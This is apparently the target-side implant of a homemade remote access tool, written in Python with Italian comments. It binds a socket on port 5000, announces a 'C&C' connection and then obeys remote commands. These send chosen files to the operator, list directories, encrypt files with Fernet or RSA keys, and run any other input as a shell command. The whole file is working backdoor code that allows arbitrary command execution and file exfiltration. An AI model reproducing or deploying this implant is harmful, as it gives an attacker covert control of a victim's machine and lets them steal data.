import socket
import subprocess
import os
from cryptography.fernet import Fernet
import rsa

# Socket
HOST = ''
PORT = 5000
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()
print("[TARGET] C&C connected.")

# Funzioni
def obtain_dir():
    current_dir = os.getcwd()
    directory_files = os.listdir('.')
    return f"Current directory: {current_dir}Contains:" + "\n".join(directory_files)

def send_file(file_name):
    try:
        with open(file_name, "rb") as f:
            file_data = f.read()
        # Header con nome file + file in binario
        header = f"FILENAME:{file_name}\n".encode()
        return header + file_data
    except FileNotFoundError:
        return b"Error: file does not exist."
    
def cyph_file(file_name, fernet):
    try:
        with open(file_name, "rb") as f:
            file_data = f.read()
        # Header con nome file + file in binario
        header_enc = f"enc_{file_name}\n".encode()
        encrypted_file = fernet.encrypt(file_data)
        return header_enc + b"\n" + encrypted_file
    except FileNotFoundError:
        return b"Error: file does not exist."

def cyph_file_asym(file_name, publickey):
    try:
        with open(file_name, "rb") as f:
            file_data = f.read()
        encrypted_asym_file = rsa.encrypt(file_data, publickey)
        return encrypted_asym_file
    except FileNotFoundError:
        return b"Error: file does not exist."


while True:
    command = conn.recv(1024).decode().strip()
    print("Command received.")
    if command.upper() == "STOP":
        break
    
    # Divide il comando in due parti
    parts = command.split(maxsplit=1)
    cmd = parts[0].upper()

    # Output se il comando è INVIA
    if cmd == "INVIA" and len(parts) > 1:
        output = send_file(parts[1]) 
        
    # Output se il comando è ELENCO
    elif cmd == "ELENCO":
        output = obtain_dir()
        output = output.encode()
        
    # Output se il comando è CIFRA
    elif cmd == "CIFRA" and len(parts) > 1:
        message = "SYN"
        message = message.encode()
        conn.send(message)
        sym_key = Fernet.generate_key()
        conn.sendall(sym_key)
        fernet = Fernet(sym_key)
        output = cyph_file(parts[1], fernet)
    
    # Output se il comando è PKENC
    elif cmd == "PKENC" and len(parts) > 1:
        received_key = conn.recv(1024)
        if received_key is not None:
            print("Key received.")
        public_key = rsa.PublicKey.load_pkcs1(received_key)
        output = cyph_file_asym(parts[1], public_key)
        
        
    # Svolge comandi cmd
    else:
        execute = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = execute.stdout + execute.stderr
        if not output:
            output = "[Command executed, output is none.]"
        output = output.encode()
        
    if isinstance(output, str):
        output = output.encode()

    conn.sendall(output)
    
conn.close()
s.close()



